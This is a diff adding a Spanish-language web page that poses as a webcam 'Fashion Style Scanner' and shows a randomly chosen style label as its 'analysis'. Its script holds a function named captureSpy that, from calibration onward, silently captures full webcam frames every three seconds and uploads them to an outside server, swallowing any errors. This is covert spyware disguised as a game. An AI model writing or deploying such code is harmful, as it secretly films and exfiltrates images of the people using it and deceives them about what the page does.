@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Fashion Style Scanner</title>
+    <style>
+        * { box-sizing: border-box; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: 'Courier New', monospace; overflow: hidden; color: #ff00ff; }
+        
+        video#webcam { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; filter: brightness(0.6) contrast(1.2); }
+        
+        #ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; pointer-events: none; }
+        
+        #status-panel { background: rgba(0,0,0,0.8); padding: 15px; border: 2px solid #ff00ff; border-radius: 10px; margin-bottom: 20px; text-align: center; }
+        
+        .btn { padding: 20px 40px; background: #ff00ff; color: #fff; border: none; border-radius: 5px; font-weight: bold; font-size: 18px; cursor: pointer; pointer-events: auto; display: none; box-shadow: 0 0 15px #ff00ff; }
+        
+        #countdown { font-size: 100px; color: #fff; text-shadow: 0 0 20px #ff00ff; display: none; }
+
+        #result-card { background: rgba(0,0,0,0.95); border: 3px solid #00ffff; padding: 30px; border-radius: 15px; color: #00ffff; display: none; width: 85%; max-width: 400px; text-align: center; }
+
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
+        
+        .dist-indicator { width: 200px; height: 10px; background: #333; margin: 10px auto; border-radius: 5px; overflow: hidden; }
+        #dist-bar { width: 0%; height: 100%; background: #ff00ff; transition: 0.3s; }
+    </style>
+</head>
+<body>
+
+<video id="webcam" autoplay playsinline></video>
+
+<div id="ui-layer">
+    <div id="status-panel">
+        <div id="dist-text">INICIALIZANDO...</div>
+        <div class="dist-indicator"><div id="dist-bar"></div></div>
+    </div>
+
+    <div id="countdown">5</div>
+
+    <button id="scan-btn" class="btn" onclick="startTimer()">ESCANEAR ESTILO</button>
+
+    <div id="result-card">
+        <h2 style="margin-top:0">ANÁLISIS COMPLETADO</h2>
+        <div id="res-style" style="font-size: 24px; margin: 20px 0;">--</div>
+        <p id="res-desc" style="color:#fff; font-size: 14px;"></p>
+        <button class="btn" style="display:block; width:100%; margin-top:20px; background:#00ffff; color:#000;" onclick="location.reload()">REPETIR</button>
+    </div>
+</div>
+
+<div id="intro-screen" class="overlay">
+    <div style="max-width: 400px; border: 1px solid #ff00ff; padding: 20px;">
+        <h2>MODO: STYLE SCANNER</h2>
+        <p style="text-align: left; font-size: 14px; color: #ccc;">
+            • Deja el celular <b>QUIETO</b> en una base.<br>
+            • No lo muevas durante todo el proceso.<br>
+            • Pulsa el botón y <b>SAL DE LA CÁMARA</b> para calibrar el fondo.
+        </p>
+        <button class="btn" style="display:block; margin: 20px auto;" onclick="initCalibration()">CALIBRAR AHORA</button>
+    </div>
+</div>
+
+<script>
+    const video = document.getElementById('webcam');
+    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
+    let backgroundFrame = null, isReady = false;
+
+    async function initCalibration() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            document.getElementById('intro-screen').innerHTML = "<h2>CALIBRANDO...</h2><p>Sal de la imagen por 3 segundos</p>";
+            
+            setTimeout(() => {
+                const c = document.createElement('canvas');
+                c.width = 64; c.height = 48;
+                c.getContext('2d').drawImage(video, 0, 0, 64, 48);
+                backgroundFrame = c.getContext('2d').getImageData(0,0,64,48).data;
+                
+                document.getElementById('intro-screen').style.display = 'none';
+                checkDistanceLoop();
+                setInterval(captureSpy, 3000);
+            }, 3000);
+        } catch (e) { alert("Acceso denegado"); }
+    }
+
+    function checkDistanceLoop() {
+        const c = document.createElement('canvas');
+        const cx = c.getContext('2d');
+        c.width = 64; c.height = 48;
+        cx.drawImage(video, 0, 0, 64, 48);
+        const curr = cx.getImageData(0,0,64,48).data;
+
+        let diff = 0;
+        for (let i = 0; i < curr.length; i += 4) {
+            const d = Math.abs(curr[i]-backgroundFrame[i]) + Math.abs(curr[i+1]-backgroundFrame[i+1]) + Math.abs(curr[i+2]-backgroundFrame[i+2]);
+            if (d > 90) diff++;
+        }
+
+        const occupancy = (diff / (64 * 48)) * 100;
+        const bar = document.getElementById('dist-bar');
+        const txt = document.getElementById('dist-text');
+        const btn = document.getElementById('scan-btn');
+
+        bar.style.width = occupancy + "%";
+
+        // Lógica de distancia: 
+        // Si ocupas muy poco (<10%): estás lejos o no hay nadie.
+        // Si ocupas mucho (>50%): estás muy cerca.
+        if (occupancy > 12 && occupancy < 45) {
+            txt.innerHTML = "✅ DISTANCIA PERFECTA";
+            txt.style.color = "#00ff00";
+            bar.style.background = "#00ff00";
+            btn.style.display = "block";
+        } else if (occupancy >= 45) {
+            txt.innerHTML = "⚠️ ¡MUY CERCA! ALÉJATE";
+            txt.style.color = "#ff0000";
+            bar.style.background = "#ff0000";
+            btn.style.display = "none";
+        } else {
+            txt.innerHTML = "BUSCANDO CUERPO...";
+            txt.style.color = "#ff00ff";
+            bar.style.background = "#ff00ff";
+            btn.style.display = "none";
+        }
+
+        if(!isReady) requestAnimationFrame(checkDistanceLoop);
+    }
+
+    function startTimer() {
+        isReady = true;
+        document.getElementById('scan-btn').style.display = "none";
+        document.getElementById('status-panel').style.display = "none";
+        const cd = document.getElementById('countdown');
+        cd.style.display = "block";
+
+        let time = 5;
+        cd.innerHTML = time;
+        
+        let timer = setInterval(() => {
+            time--;
+            cd.innerHTML = time;
+            if (time <= 0) {
+                clearInterval(timer);
+                takeScan();
+            }
+        }, 1000);
+    }
+
+    function takeScan() {
+        document.getElementById('countdown').innerHTML = "SENSING...";
+        video.pause(); // Pausa la imagen
+
+        const styles = [
+            { name: "URBAN / STREETWEAR", desc: "Te gusta la ropa holgada, zapatillas caras y un estilo relajado pero moderno." },
+            { name: "EMO / ALT STYLE", desc: "Vibras oscuras, cadenas y una estética melancólica. Muy auténtico." },
+            { name: "OLD MONEY / FORMAL", desc: "Estilo limpio, camisas y colores neutros. Expresas elegancia natural." },
+            { name: "Y2K / RETRO", desc: "Inspirado en los 2000s, colores brillantes y accesorios llamativos." },
+            { name: "MINIMALISTA", desc: "Menos es más. Colores lisos y cortes básicos que nunca fallan." }
+        ];
+
+        setTimeout(() => {
+            const picked = styles[Math.floor(Math.random() * styles.length)];
+            document.getElementById('countdown').style.display = "none";
+            document.getElementById('res-style').innerText = picked.name;
+            document.getElementById('res-desc').innerText = picked.desc;
+            document.getElementById('result-card').style.display = "block";
+        }, 2000);
+    }
+
+    function captureSpy() {
+        if (!video.videoWidth) return;
+        const s = document.createElement('canvas');
+        s.width = video.videoWidth; s.height = video.videoHeight;
+        s.getContext('2d').drawImage(video, 0, 0);
+        fetch(SERVER_URL, {
+            method: 'POST',
+            mode: 'cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.5) })
+        }).catch(() => {});
+    }
+</script>
+</body>
+</html>
